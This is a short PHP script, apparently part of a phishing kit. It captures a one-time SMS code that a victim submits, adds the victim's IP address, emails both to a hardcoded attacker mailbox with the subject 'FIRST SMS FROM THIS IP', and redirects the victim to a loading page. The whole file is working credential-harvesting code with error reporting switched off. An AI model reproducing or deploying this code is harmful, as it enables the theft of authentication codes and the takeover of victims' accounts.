<?php

 session_start();
error_reporting(0);
$ip = $_SERVER['REMOTE_ADDR'];
$email='csssjs99@gmail.com';
$message .= "|----------------[Payload]----------------|\n";
$message .= "==========================\n";
$message .= "               SMS 1  : ".$_POST['sms']."\n";
$message .= "==========================\n";
$message .= "|----------------[Payload]----------------|\n";
$subject = " FIRST SMS FROM THIS IP:  $ip";
$headers = "From: Astro <info@online.net>";
mail("$email", "$subject", "$message", "$headers");

header('location:./load2.html');

?>